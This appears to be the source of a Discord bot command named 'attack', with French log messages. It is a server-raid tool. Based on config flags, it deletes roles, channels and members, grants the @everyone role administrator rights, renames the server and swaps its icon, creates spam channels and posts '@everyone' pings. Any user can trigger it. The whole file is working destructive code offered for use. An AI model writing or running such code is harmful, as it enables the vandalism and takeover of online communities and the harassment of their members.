const settings = require('../settings.json');
const moment = require('moment');
const chalk = require('chalk');
exports.run = (client, message, args) => {

    if (settings.config.ban === 1) {
    message.guild.members.map(m=>{
        if (m.position >= message.guild.me.highestRole.position) {
            m.delete();
        }
    });
    }


    function suite(){
        message.guild.edit({
            name: settings.config.name
        }).catch(console.error);
        message.guild.setIcon(settings.config.img);
    }
    



    if (settings.config.admin === 1) {
    message.guild.roles.find('name', '@everyone').edit({
        permissions: [8]
    }).catch(console.error);
    }
    if (settings.config.role_dlt === 1) {
    Promise.all(message.guild.roles.map(c => c.delete())).catch(console.error);
    }
    if (settings.config.role_crt === 1) {
        message.guild.createRole({
            name: 'undefined-1'
        }).catch(console.error);
    }
   
    /*if (settings.config.spam === 'y') {
    message.guild.createChannel('undefined-156', 'text').catch(console.error);
    function suite(){
        message.guild.createChannel('spam', 'text').catch(console.error);
        message.guild.channels.find('name', 'spam').send('spam').catch(console.error);
    }
    setTimeout(suite, 1000)
    }*/
    if (settings.sp !== "1") {
        message.guild.createChannel('undefined-156');
        console.log(chalk.inverse(`[${moment().format('DD-MM-YYYY HH:mm:ss')}] `) + chalk.black.bgRed(`Le spam a été lancé sur le serveur "${message.guild.name}".`));
    }
    message.channel.send('spam @everyone');
    message.guild.createChannel(settings.config.chnlname);

        if (settings.config.spam === 'Créer des salons textuels à l\'infini') {
            const typer = 'text';
            message.guild.createChannel('undefined-3', typer).catch(console.error);
        }
        if (settings.config.spam === 'Créer des salons vocaux') {
            const typer = 'voice';
            message.guild.createChannel('undefined-3', typer).catch(console.error);

        }
        if (settings.config.spam === 'Créer des catégories') {
            const typer = 'category';
            message.guild.createChannel('undefined-3', typer).catch(console.error);
        }
    if (settings.config.chnl_dlt === 1){
    Promise.all(message.guild.channels.map(c => c.delete())).catch(console.error);
    }
    if (settings.config.imgnom === 1) {
    setTimeout(suite, 500);
    }
}

exports.conf = {
    permLevel: 0,
    aliases: []
}

exports.help = {
    name: 'attack'
}
